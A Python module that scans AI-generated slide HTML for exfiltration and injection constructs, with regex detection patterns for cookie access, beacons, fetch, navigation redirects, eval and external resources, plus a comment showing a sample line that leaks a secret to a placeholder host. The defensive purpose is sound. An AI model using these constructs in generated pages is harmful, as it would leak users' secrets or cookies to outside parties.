"""Scan LLM-generated slide HTML/JS for exfiltration / injection patterns.

AISEC-248 PR1: detection layer. Runtime enforcement is the CSP injected by the
frontend slide-document builder; this module rejects + logs at generation time.
Legitimate slides never use these constructs (chart data is inlined, images are
data: URIs), so any hit is off-path.
"""

import re
from typing import List

# Script sources allowed in slides (Chart.js + Tailwind Play CDN + Google Fonts).
# Google Fonts <link>s are allowed by the slide CSP `style-src`/`font-src` at
# runtime, so the scanner must not flag them as external resources.
_ALLOWED_SCRIPT_HOSTS = (
    "https://cdn.jsdelivr.net",
    "https://cdn.tailwindcss.com",
    "https://fonts.googleapis.com",
    "https://fonts.gstatic.com",
)

# (label, compiled regex). Order is stable for predictable reporting.
#
# Navigation / redirect patterns matter because CSP cannot reliably block a frame
# navigating itself (the `navigate-to` directive was dropped from CSP3). A slide
# could otherwise exfiltrate via `window.location = "https://x/?d=" + secret`, a
# `window.open`, or a `<meta http-equiv="refresh" url=...>`. Legitimate slides
# never navigate, so flagging these is high-precision. (Prose like "Sales by
# location" or "navigate the report" does not match — the patterns require the
# JS member-access / assignment forms, not the bare words.)
_PATTERNS = [
    ("fetch", re.compile(r"\bfetch\s*\(")),
    ("XMLHttpRequest", re.compile(r"\bXMLHttpRequest\b")),
    ("navigator.sendBeacon", re.compile(r"\bnavigator\s*\.\s*sendBeacon\b")),
    ("document.cookie", re.compile(r"\bdocument\s*\.\s*cookie\b")),
    ("eval", re.compile(r"\beval\s*\(")),
    ("new Function", re.compile(r"\bnew\s+Function\s*\(")),
    ("form action", re.compile(r"<form\b[^>]*\baction\s*=", re.IGNORECASE)),
    # navigation: assigning to (window|document).location or .location.href
    ("navigation: location assignment",
     re.compile(r"\b(?:window|document)\s*\.\s*location\b\s*(?:\.\s*href\s*)?=")),
    # navigation: location.href/.assign()/.replace() (with or without window/document prefix)
    ("navigation: location.href/assign/replace",
     re.compile(r"\blocation\s*\.\s*(?:href\s*=|assign\s*\(|replace\s*\()")),
    ("navigation: window.open", re.compile(r"\bwindow\s*\.\s*open\s*\(")),
    # redirect: <meta http-equiv="refresh" ...>
    ("meta refresh redirect",
     re.compile(r"<meta\b[^>]*http-equiv\s*=\s*['\"]?\s*refresh", re.IGNORECASE)),
    # inline event handlers inside a tag (onclick=, onload=, onerror=, ...).
    # INTENTIONAL POLICY: slides render under SLIDE_CSP with no 'unsafe-hashes',
    # so inline handlers do not execute at runtime anyway; flagging them turns a
    # silent no-op into a corrective-retry signal. Do not soften.
    ("inline event handler", re.compile(r"<[^>]+\son[a-z]+\s*=", re.IGNORECASE)),
    # javascript: scheme in any attribute value
    ("javascript: URI", re.compile(r"=\s*['\"]?\s*javascript:", re.IGNORECASE)),
    # image-beacon constructor
    ("new Image beacon", re.compile(r"\bnew\s+Image\s*\(")),
]

# External resource references: img/script/iframe `src` or link `href` to an
# http(s) URL. Two capture groups (the src form and the link-href form); the
# loop reads whichever matched.
_EXTERNAL_SRC = re.compile(
    r"<(?:img|script|iframe)\b[^>]*\bsrc\s*=\s*['\"](https?://[^'\"]+)"
    r"|<link\b[^>]*\bhref\s*=\s*['\"](https?://[^'\"]+)",
    re.IGNORECASE,
)


def scan_html_for_unsafe_patterns(html: str) -> List[str]:
    """Return a list of human-readable findings; empty list means clean."""
    if not html:
        return []

    findings: List[str] = []

    for label, pattern in _PATTERNS:
        if pattern.search(html):
            findings.append(f"unsafe pattern: {label}")

    for match in _EXTERNAL_SRC.finditer(html):
        url = match.group(1) or match.group(2)
        if url and not url.lower().startswith(_ALLOWED_SCRIPT_HOSTS):
            findings.append(f"external resource src: {url}")

    return findings
